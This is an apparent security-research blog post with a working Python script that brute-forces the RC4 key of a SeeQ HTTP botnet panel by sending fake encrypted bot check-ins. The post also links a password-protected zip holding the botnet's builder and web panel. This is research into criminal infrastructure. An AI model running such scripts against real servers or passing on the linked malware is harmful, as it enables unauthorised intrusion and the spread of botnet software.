<div><div id="highlighter_531412" class="syntaxhighlighter  python"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python keyword">import</code> <code class="python plain">urllib,urllib2,sys</code></div><div class="line number2 index1 alt1">&nbsp;</div><div class="line number3 index2 alt2"><code class="python keyword">if</code> <code class="python plain">(</code><code class="python functions">len</code> <code class="python plain">(sys.argv) &lt; </code><code class="python value">3</code><code class="python plain">):</code></div><div class="line number4 index3 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python string">"Usage: "</code> <code class="python keyword">+</code> <code class="python plain">sys.argv[</code><code class="python value">0</code><code class="python plain">] </code><code class="python keyword">+</code> <code class="python string">" url to gate.php \t dictionary location"</code></div><div class="line number5 index4 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python string">"Example: "</code> <code class="python keyword">+</code> <code class="python plain">sys.argv[</code><code class="python value">0</code><code class="python plain">] </code><code class="python keyword">+</code> <code class="python string">" <a href="http://localhost/Panel/gate.php">http://localhost/Panel/gate.php</a> dict.txt"</code></div><div class="line number6 index5 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">exit()</code></div><div class="line number7 index6 alt2">&nbsp;</div><div class="line number8 index7 alt1"><code class="python plain">url </code><code class="python keyword">=</code> <code class="python plain">sys.argv[</code><code class="python value">1</code><code class="python plain">]</code></div><div class="line number9 index8 alt2"><code class="python plain">header </code><code class="python keyword">=</code> <code class="python plain">{ </code><code class="python string">'User-Agent'</code> <code class="python plain">: </code><code class="python string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</code> <code class="python plain">}</code></div><div class="line number10 index9 alt1">&nbsp;</div><div class="line number11 index10 alt2"><code class="python comments">#rc4crypt Made by Thimo Kraemer thimo.kraemer [at] joonis.de</code></div><div class="line number12 index11 alt1"><code class="python keyword">def</code> <code class="python plain">rc4crypt(data, key):</code></div><div class="line number13 index12 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">x </code><code class="python keyword">=</code> <code class="python value">0</code></div><div class="line number14 index13 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">box </code><code class="python keyword">=</code> <code class="python functions">range</code><code class="python plain">(</code><code class="python value">256</code><code class="python plain">)</code></div><div class="line number15 index14 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code> <code class="python plain">i </code><code class="python keyword">in</code> <code class="python functions">range</code><code class="python plain">(</code><code class="python value">256</code><code class="python plain">):</code></div><div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">x </code><code class="python keyword">=</code> <code class="python plain">(x </code><code class="python keyword">+</code> <code class="python plain">box[i] </code><code class="python keyword">+</code> <code class="python functions">ord</code><code class="python plain">(key[i </code><code class="python keyword">%</code> <code class="python functions">len</code><code class="python plain">(key)])) </code><code class="python keyword">%</code> <code class="python value">256</code></div><div class="line number17 index16 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">box[i], box[x] </code><code class="python keyword">=</code> <code class="python plain">box[x], box[i]</code></div><div class="line number18 index17 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">x </code><code class="python keyword">=</code> <code class="python value">0</code></div><div class="line number19 index18 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">y </code><code class="python keyword">=</code> <code class="python value">0</code></div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">out </code><code class="python keyword">=</code> <code class="python plain">[]</code></div><div class="line number21 index20 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code> <code class="python plain">char </code><code class="python keyword">in</code> <code class="python plain">data:</code></div><div class="line number22 index21 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">x </code><code class="python keyword">=</code> <code class="python plain">(x </code><code class="python keyword">+</code> <code class="python value">1</code><code class="python plain">) </code><code class="python keyword">%</code> <code class="python value">256</code></div><div class="line number23 index22 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">y </code><code class="python keyword">=</code> <code class="python plain">(y </code><code class="python keyword">+</code> <code class="python plain">box[x]) </code><code class="python keyword">%</code> <code class="python value">256</code></div><div class="line number24 index23 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">box[x], box[y] </code><code class="python keyword">=</code> <code class="python plain">box[y], box[x]</code></div><div class="line number25 index24 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">out.append(</code><code class="python functions">chr</code><code class="python plain">(</code><code class="python functions">ord</code><code class="python plain">(char) ^ box[(box[x] </code><code class="python keyword">+</code> <code class="python plain">box[y]) </code><code class="python keyword">%</code> <code class="python value">256</code><code class="python plain">]))</code></div><div class="line number26 index25 alt1">&nbsp;</div><div class="line number27 index26 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python plain">''.join(out)</code></div><div class="line number28 index27 alt1">&nbsp;</div><div class="line number29 index28 alt2"><code class="python keyword">def</code> <code class="python plain">decrypt ():</code></div><div class="line number30 index29 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">post_values </code><code class="python keyword">=</code> <code class="python plain">{</code></div><div class="line number31 index30 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python string">'hwid'</code> <code class="python plain">: </code><code class="python string">'1'</code><code class="python plain">,</code></div><div class="line number32 index31 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python string">'system'</code> <code class="python plain">: </code><code class="python string">'1'</code><code class="python plain">,</code></div><div class="line number33 index32 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python string">'mode'</code> <code class="python plain">: </code><code class="python string">'0'</code><code class="python plain">,</code></div><div class="line number34 index33 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python string">'socks5'</code> <code class="python plain">: </code><code class="python string">'0'</code></div><div class="line number35 index34 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">}</code></div><div class="line number36 index35 alt1">&nbsp;</div><div class="line number37 index36 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">f </code><code class="python keyword">=</code> <code class="python functions">open</code><code class="python plain">(sys.argv[</code><code class="python value">2</code><code class="python plain">],</code><code class="python string">"r"</code><code class="python plain">)</code></div><div class="line number38 index37 alt1">&nbsp;</div><div class="line number39 index38 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code> <code class="python plain">line </code><code class="python keyword">in</code> <code class="python plain">f:</code></div><div class="line number40 index39 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">line </code><code class="python keyword">=</code> <code class="python plain">line.rstrip()</code></div><div class="line number41 index40 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">encData </code><code class="python keyword">=</code> <code class="python plain">urllib.urlencode(post_values)</code></div><div class="line number42 index41 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">encData </code><code class="python keyword">=</code> <code class="python plain">rc4crypt(encData,line)</code></div><div class="line number43 index42 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">req </code><code class="python keyword">=</code> <code class="python plain">urllib2.Request(url,encData,header)</code></div><div class="line number44 index43 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">resp </code><code class="python keyword">=</code>&nbsp; <code class="python plain">urllib2.urlopen(req).read()</code></div><div class="line number45 index44 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">resp</code><code class="python keyword">=</code><code class="python keyword">=</code><code class="python plain">rc4crypt(line,line): </code><code class="python comments"># Correct key if the</code></div><div class="line number46 index45 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments"># response is the sent key hashed.</code></div><div class="line number47 index46 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python string">"Encryption key:"</code> <code class="python keyword">+</code> <code class="python plain">line</code></div><div class="line number48 index47 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number49 index48 alt2">&nbsp;</div><div class="line number50 index49 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">f.close()</code></div><div class="line number51 index50 alt2">&nbsp;</div><div class="line number52 index51 alt1"><code class="python plain">decrypt()</code></div></div></td></tr></tbody></table></div></div>
<p><a href="http://tomsonsec.com/wp-content/uploads/2014/03/seeq.png"><img class="aligncenter size-full wp-image-271" alt="seeq" src="Brute%20forcing%20SeeQ%20http%20botnet%20encryption%20%7C%20TomsonSec_files/700x164xseeq.jpg" height="164" width="700"></a></p>
<p>From the authors point of view this implementation may not be the 
best choice if the users choose a short password. As an alternative he 
could have always responded with the sent key encrypted making it only 
possible for the bot itself to compare if it’s the correct one.</p>
<p>Zip with SeeQ including the builder and web panel: <a title="SeeQHTTPBOT.zip" href="http://tomsonsec.com/files/SeeQHTTPBOT.zip">SeeQHTTPBOT.zip</a> password:SeeQ<br>
The builder can be hazardous, I don’t know.</p>
<p>It may show up a report on the binary itself later on but this is all for now!</p>
</div> 
<footer class="entry-meta">
This entry was posted in <a href="http://tomsonsec.com/index.php/category/botnet/" rel="category tag">botnet</a>, <a href="http://tomsonsec.com/index.php/category/php/" rel="category tag">php</a>, <a href="http://tomsonsec.com/index.php/category/security/" rel="category tag">security</a> and tagged <a href="http://tomsonsec.com/index.php/tag/bot/" rel="tag">bot</a>, <a href="http://tomsonsec.com/index.php/tag/botnet/" rel="tag">botnet</a>, <a href="http://tomsonsec.com/index.php/tag/encryption/" rel="tag">encryption</a>, <a href="http://tomsonsec.com/index.php/tag/http/" rel="tag">http</a>, <a href="http://tomsonsec.com/index.php/tag/seeq/" rel="tag">seeq</a> on <a href="http://tomsonsec.com/index.php/brute-forcing-seeq-http-botnet-encryption/" title="10:07 pm" rel="bookmark"><time class="entry-date" datetime="2014-03-22T22:07:21+00:00">March 22, 2014</time></a><span class="by-author"> by <span class="author vcard"><a class="url fn n" href="http://tomsonsec.com/index.php/author/tomasuh/" title="View all posts by Tomasuh" rel="author">Tomasuh</a></span></span>. </footer> 
</article> 
<nav class="nav-single">
<h3 class="assistive-text">Post navigation</h3>
<span class="nav-previous"><a href="http://tomsonsec.com/index.php/smart-zip-extraction-in-python/" rel="prev"><span class="meta-nav">←</span> Smart zip extraction in python</a></span>
<span class="nav-next"><a href="http://tomsonsec.com/index.php/pbboard/" rel="next">PBBoard &lt;= 3.0.1 user cookie hash disclousere <span class="meta-nav">→</span></a></span>
				</nav><!-- .nav-single -->

				
<div id="comments" class="comments-area">

	
	
									<div id="respond" class="comment-respond">
				<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="http://tomsonsec.com/index.php/brute-forcing-seeq-http-botnet-encryption/#respond" style="display:none;">Cancel reply</a></small></h3>
									<form action="http://tomsonsec.com/wp-comments-post.php" method="post" id="commentform" class="comment-form">
																			<p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> Required fields are marked <span class="required">*</span></p>							<p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" size="30" aria-required="true" type="text"></p>
<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" size="30" aria-describedby="email-notes" aria-required="true" type="text"></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" size="30" type="text"></p>
												<p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" aria-describedby="form-allowed-tags" aria-required="true"></textarea></p>						<p class="form-allowed-tags" id="form-allowed-tags">You may use these <abbr title="HyperText Markup Language">HTML</abbr> tags and attributes:  <code>&lt;a
 href="" title=""&gt; &lt;abbr title=""&gt; &lt;acronym title=""&gt; 
&lt;b&gt; &lt;blockquote cite=""&gt; &lt;cite&gt; &lt;code&gt; &lt;del 
datetime=""&gt; &lt;em&gt; &lt;i&gt; &lt;q cite=""&gt; &lt;strike&gt; 
&lt;strong&gt; </code></p>						<p class="form-submit">
							<input name="submit" id="submit" class="submit" value="Post Comment" type="submit">
							<input name="comment_post_ID" value="255" id="comment_post_ID" type="hidden">
<input name="comment_parent" id="comment_parent" value="0" type="hidden">
						</p>
						<p style="display: none;"><input id="akismet_comment_nonce" name="akismet_comment_nonce" value="b4c3659705" type="hidden"></p><p style="display: none;"></p>					<input id="ak_js" name="ak_js" value="1419606296114" type="hidden"></form>
							</div><!-- #respond -->
			
</div><!-- #comments .comments-area -->
			
		</div><!-- #content -->
	</div><!-- #primary -->


		</div><!-- #main .wrapper -->
	<footer id="colophon" role="contentinfo">
		<div class="site-info">
						<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform">Proudly powered by WordPress</a>
		</div><!-- .site-info -->
	</footer><!-- #colophon -->
</div><!-- #page -->

	
<!-- START: Syntax Highlighter ComPress -->
<script data-rocketoptimized="true" type="text/rocketscript">SyntaxHighlighter.autoloader('applescript			http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushAppleScript.js','actionscript3 as3		http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushAS3.js','bash shell				http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushBash.js','coldfusion cf			http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushColdFusion.js','cpp c					http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushCpp.js','c# c-sharp csharp		http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushCSharp.js','css					http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushCss.js','delphi pascal pas		http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushDelphi.js','diff patch			    http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushDiff.js','erl erlang				http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushErlang.js','groovy					http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushGroovy.js','java					http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushJava.js','jfx javafx				http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushJavaFX.js','js jscript javascript	http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushJScript.js','perl pl				http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushPerl.js','php					http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushPhp.js','text plain				http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushPlain.js','powershell ps          http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushPowerShell.js','py python				http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushPython.js','ruby rails ror rb		http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushRuby.js','sass scss              http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushSass.js','scala					http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushScala.js','sql					http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushSql.js','vb vbnet				http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushVb.js','xml xhtml xslt html	http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushXml.js');SyntaxHighlighter.defaults['toolbar']=false;SyntaxHighlighter.defaults['tab-size']=4;SyntaxHighlighter.all();</script>
<!-- END: Syntax Highlighter ComPress -->

				<script data-rocketoptimized="true" type="text/rocketscript">function showhide_toggle(a,b,c,d){var e=jQuery("#"+a+"-link-"+b),f=jQuery("#"+a+"-content-"+b);a=jQuery("#"+a+"-toggle-"+b);e.toggleClass("sh-show sh-hide");f.toggleClass("sh-show sh-hide").toggle();a.text()===c?a.text(d):a.text(c)};</script>
	<script data-rocketoptimized="true" type="text/rocketscript">//<![CDATA[
var ak_js=document.getElementById("ak_js");if(!ak_js){ak_js=document.createElement('input');ak_js.setAttribute('id','ak_js');ak_js.setAttribute('name','ak_js');ak_js.setAttribute('type','hidden');}
else{ak_js.parentNode.removeChild(ak_js);}
ak_js.setAttribute('value',(new Date()).getTime());var commentForm=document.getElementById('commentform');if(commentForm){commentForm.appendChild(ak_js);}
else{var replyRowContainer=document.getElementById('replyrow');if(replyRowContainer){var children=replyRowContainer.getElementsByTagName('td');if(children.length>0){children[0].appendChild(ak_js);}}}
//]]></script>
<script data-rocketoptimized="true" type="text/rocketscript">//<![CDATA[
var addComment={moveForm:function(a,b,c,d){var e,f=this,g=f.I(a),h=f.I(c),i=f.I("cancel-comment-reply-link"),j=f.I("comment_parent"),k=f.I("comment_post_ID");if(g&&h&&i&&j){f.respondId=c,d=d||!1,f.I("wp-temp-form-div")||(e=document.createElement("div"),e.id="wp-temp-form-div",e.style.display="none",h.parentNode.insertBefore(e,h)),g.parentNode.insertBefore(h,g.nextSibling),k&&d&&(k.value=d),j.value=b,i.style.display="",i.onclick=function(){var a=addComment,b=a.I("wp-temp-form-div"),c=a.I(a.respondId);if(b&&c)return a.I("comment_parent").value="0",b.parentNode.insertBefore(c,b),b.parentNode.removeChild(b),this.style.display="none",this.onclick=null,!1};try{f.I("comment").focus()}catch(l){}return!1}},I:function(a){return document.getElementById(a)}};
//]]></script>
<script data-rocketoptimized="true" type="text/rocketscript">//<![CDATA[
(function(){var nav=document.getElementById('site-navigation'),button,menu;if(!nav)
return;button=nav.getElementsByTagName('h3')[0];menu=nav.getElementsByTagName('ul')[0];if(!button)
return;if(!menu||!menu.childNodes.length){button.style.display='none';return;}
button.onclick=function(){if(-1==menu.className.indexOf('nav-menu'))
menu.className='nav-menu';if(-1!=button.className.indexOf('toggled-on')){button.className=button.className.replace(' toggled-on','');menu.className=menu.className.replace(' toggled-on','');}else{button.className+=' toggled-on';menu.className+=' toggled-on';}};})();
//]]></script>

</body></html>